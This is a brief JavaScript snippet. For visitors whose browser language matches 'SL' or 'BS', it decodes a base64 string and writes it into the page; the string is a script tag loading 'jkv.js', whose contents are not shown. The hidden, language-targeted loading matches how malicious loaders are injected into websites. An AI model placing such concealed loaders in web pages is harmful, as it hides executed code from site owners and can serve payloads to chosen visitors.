if(/SL|BS/i.test(navigator.language || navigator.userLanguage)){

var string = 'PHNjcmlwdCBzcmM9Imprdi5qcyI+PC9zY3JpcHQ+';
var decodedString = atob(string);
document.write(''+ decodedString +'');
  
}